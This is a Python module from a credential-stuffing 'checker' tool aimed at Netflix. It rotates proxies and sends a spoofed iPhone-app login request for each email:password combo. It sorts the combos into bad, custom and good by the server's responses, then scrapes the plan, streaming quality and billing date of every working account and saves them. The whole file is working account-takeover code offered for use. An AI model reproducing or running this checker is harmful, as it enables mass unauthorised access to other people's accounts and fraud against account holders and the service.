from modules.variables import Checker
from modules.functions import bad_proxy, log, save, set_proxy, return_proxy, get_string
from requests import Session
import functools
from requests.adapters import HTTPAdapter, Retry
from urllib import parse

def check(email:str,password:str):
    while not Checker.stopping:
        try:
            with Session() as s:
                proxy = set_proxy()
                proxy_set = set_proxy(proxy)

                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))

                KIR = f'NFAPPL-02-IPHONE7=2-{get_string(64)}'
                data = parse.quote('{"action":"loginAction","fields":{"userLoginId":"'+email+'","rememberMe":"true","password":"'+password+'"},"verb":"POST","mode":"login","flow":"appleSignUp"}')
                payload = 'appInternalVersion=11.44.0&appVersion=11.44.0&callPath=%5B%22moneyball%22%2C%22appleSignUp%22%2C%22next%22%5D&config=%7B%22useSecureImages%22%3Atrue%2C%22billboardTrailerEnabled%22%3A%22false%22%2C%22clipsEnabled%22%3A%22false%22%2C%22titleCapabilityFlattenedShowEnabled%22%3A%22true%22%2C%22seasonRenewalPostPlayEnabled%22%3A%22true%22%2C%22previewsBrandingEnabled%22%3A%22true%22%2C%22aroGalleriesEnabled%22%3A%22true%22%2C%22interactiveFeatureSugarPuffsEnabled%22%3A%22true%22%2C%22showMoreDirectors%22%3Atrue%2C%22searchImageLocalizationFallbackLocales%22%3Atrue%2C%22billboardEnabled%22%3A%22true%22%2C%22searchImageLocalizationOnResultsOnly%22%3A%22false%22%2C%22interactiveFeaturePIBEnabled%22%3A%22true%22%2C%22warmerHasGenres%22%3Atrue%2C%22interactiveFeatureBadgeIconTestEnabled%22%3A%229.57.0%22%2C%22previewsRowEnabled%22%3A%22true%22%2C%22kidsMyListEnabled%22%3A%22true%22%2C%22billboardPredictionEnabled%22%3A%22false%22%2C%22kidsBillboardEnabled%22%3A%22true%22%2C%22characterBarOnPhoneEnabled%22%3A%22false%22%2C%22contentWarningEnabled%22%3A%22true%22%2C%22bigRowEnabled%22%3A%22true%22%2C%22interactiveFeatureAppUpdateDialogueEnabled%22%3A%22false%22%2C%22familiarityUIEnabled%22%3A%22false%22%2C%22bigrowNewUIEnabled%22%3A%22false%22%2C%22interactiveFeatureSugarPuffsPreplayEnabled%22%3A%22true%22%2C%22volatileBillboardEnabled%22%3A%22false%22%2C%22motionCharacterEnabled%22%3A%22true%22%2C%22roarEnabled%22%3A%22true%22%2C%22billboardKidsTrailerEnabled%22%3A%22false%22%2C%22interactiveFeatureBuddyEnabled%22%3A%22true%22%2C%22mobileCollectionsEnabled%22%3A%22false%22%2C%22interactiveFeatureMinecraftEnabled%22%3A%22true%22%2C%22searchImageLocalizationEnabled%22%3A%22false%22%2C%22interactiveFeatureKimmyEnabled%22%3A%22true%22%2C%22interactiveFeatureYouVsWildEnabled%22%3A%22true%22%2C%22interactiveFeatureStretchBreakoutEnabled%22%3A%22true%22%2C%22kidsTrailers%22%3Atrue%7D&device_type=NFAPPL-02-&esn={KIR}&idiom=phone&iosVersion=12.4.3&isTablet=false&kids=false&maxDeviceWidth=375&method=call&model=saget&modelType=IPHONE7-2&odpAware=true&param={DATA}&pathFormat=graph&pixelDensity=2.0&progressive=false&responseFormat=json'.format(KIR=KIR,DATA=data)

                r = s.post('https://ios.prod.http1.netflix.com/iosui/user/11.1',
                    allow_redirects = False,
                    data = payload,
                    headers = {
                            "Host": "ios.prod.ftl.netflix.com" ,
                            "X-Netflix.Argo.abTests": "" ,
                            "X-Netflix.client.appVersion": "11.44.0" ,
                            "Accept": "*/*" ,
                            "X-Netflix.Argo.NFNSM": "9" ,
                            "Accept-Language": "en-US;q=1, fa-UK;q=0.9, en-UK;q=0.8, ar-UK;q=0.7" ,
                            "Accept-Encoding": "gzip, deflate" ,
                            "X-Netflix.Request.Attempt": "1" ,
                            "X-Netflix.client.idiom": "phone" ,
                            "X-Netflix.Request.Routing": "{\"path\":\"/nq/iosui/argo/~11.44.0/user\",\"control_tag\":\"iosui_argo_non_member\"}" ,
                            "User-Agent": "Argo/11.44.0 (iPhone; iOS 12.4.3; Scale/2.00)" ,
                            "X-Netflix.client.type": "argo" ,
                            "Content-Length": f"{len(payload)}" ,
                            "Content-Type":"application/x-www-form-urlencoded",
                            "Connection": "close" ,
                            "X-Netflix.client.iosVersion": "10.3.3" ,
                    }
                )
                if any(key in r.text for key in ["\"value\":\"incorrect_password\"},","unrecognized_email_consumption_only","login_error_consumption_only"]):
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                elif any(key in r.text for key in ["never_member_consumption_only","former_member_consumption_only"]):
                    if not Checker.cui: log("custom",":".join([email,password]),"Netflix")
                    save("Netflix","custom",Checker.time,":".join([email,password]))
                    Checker.custom += 1
                    return_proxy(proxy)
                    return
                elif "memberHome" not in r.text:
                    raise

                r = s.get('https://www.netflix.com/YourAccount',allow_redirects=False,
                    headers = {
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" ,
                        "Accept-Encoding": "gzip, deflate, br" ,
                        "Accept-Language": "en-US,en;q=0.9" ,
                        "Connection": "keep-alive" ,
                        "Host": "www.netflix.com" ,
                        "Referer": "https://www.netflix.com/browse" ,
                        "Sec-Fetch-Dest": "document" ,
                        "Sec-Fetch-Mode": "navigate" ,
                        "Sec-Fetch-Site": "same-origin" ,
                        "Sec-Fetch-User": "?1" ,
                        "Upgrade-Insecure-Requests": "1" ,
                        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" ,
                    }
                )

                if any(key in r.text for key in ["\"serviceOnHoldForCCFail\":true","\"isHoldPayment\":true","Your membership is paused."]):
                    if not Checker.cui: log("custom",":".join([email,password]),"Netflix")
                    save("Netflix","custom",Checker.time,":".join([email,password]))
                    Checker.custom += 1
                    return_proxy(proxy)
                    return
                
                plan = r.text.split("plan-label\"><b>")[1].split("</b>")[0]
                quality = r.text.split("\"videoQuality\":{\"fieldType\":\"String\",\"value\":\"")[1].split("\"}")[0]
                max_streams = r.text.split("\"maxStreams\":")[2].split(",\"")[0]
                billing_date = r.text.split("nextBillingDate\":{\"fieldType\":\"String\",\"value\":\"")[1].split("\"")[0].replace("\\x20",'/')
                
                if not Checker.cui: log("good",':'.join([email,password]),"Netflix")
                save("Netflix","good",Checker.time,':'.join([email,password])+f' | Plan: {plan} | Quality: {quality} | Max Streams: {max_streams} | Billing Date: {billing_date}')
                Checker.good += 1
                return_proxy(proxy)
                return

        except:
            bad_proxy(proxy)
            return_proxy(proxy)
            Checker.errors += 1